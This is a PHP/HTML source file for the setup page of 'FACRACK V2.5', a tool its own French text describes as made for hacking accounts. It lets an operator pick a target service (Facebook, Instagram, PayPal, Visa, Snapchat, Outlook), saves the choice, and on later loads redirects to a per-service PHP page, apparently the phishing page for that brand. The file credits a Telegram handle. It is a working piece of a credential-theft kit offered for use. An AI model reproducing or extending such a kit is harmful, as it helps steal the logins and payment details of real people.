<?php  ob_start();
 ?><!DOCTYPE html>
<html>
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  <!-- CSS only -->
<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-1BmE4kWBq78iYhFldvKuhfTAU6auU8tT94WrHftjDbrCEXSU1oBoqyl2QvZ6jIW3" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.3.0/font/bootstrap-icons.css">
<head>

</head>
<body>

  <center>
    <center>
      
      <style type="text/css">
        body{
          background-color: #000000;
          color: red;
        }
        a{
          text-decoration: none;
          color: #008040;
        }
      </style>

      <?php
$filename = 'service.txt';

if (file_exists($filename)) {
   $myfile = fopen("$filename", "r") or die("Unable to open file!");
    $contenu=fgets($myfile);
   header('location:'.$contenu.'.php');
fclose($myfile);
} else {
    ?>

      <form method="POST" action="script.php"> 
        <h1 style="color: #008040;">[̲̅F][̲̅A][̲̅C][̲̅R][̲̅A][̲̅C][̲̅K] [̲̅V][̲̅2][̲̅.][̲̅5] </h1>
        <div>
          <i style="font-size: 12px;">Vous êtes sur le point d'effectuer la première configuration du logiciel FACRACK destiner au piratage des comptes</i>
        </div>
        _______________________________
        <br>
        platforme d'utilisation<br>
        ----<img src="https://cdn-icons-png.flaticon.com/512/220/220215.png" style="height: 30px;" title="Windows">
        <img src="https://img.icons8.com/ios-filled/50/fa314a/ios-logo.png" title="Apple" style="height: 30px;">
        <img src="https://img.icons8.com/ios-filled/50/fa314a/android-os.png" style="height: 30px;" title="Android">----
        <br><br>

        <i class="bi bi-motherboard"></i> Service : <select name="service" style="background-color: #008040;border: none;">
          <?php if (isset($service)) {
            ?><option><?php echo "$service"; ?></option> <?php
          } ?>
          <option>facebook</option>
          <option>instagram</option>
          <option>paypal</option>
          <option>visa</option>
          <option>snapchat</option>
          <option>outlook</option>
        </select>

        <br><br>
        <button type="submit" name="app" style="background-color: red;color: white;border: none;padding: 4px 4px 4px 4px;">【﻿Ａｐｐｌｉｑｕｅｒ】</button>
        <br>
        <br>
        <br>

        <a href="https://t.me/dr_sans_fil">copyright©@Dr_sans_fil</a>
      </form>
    </center>
  </center>

  <head>
    
  </head>
</body>

</html>


<?php
}
?>
<?php 
ob_end_flush();
?>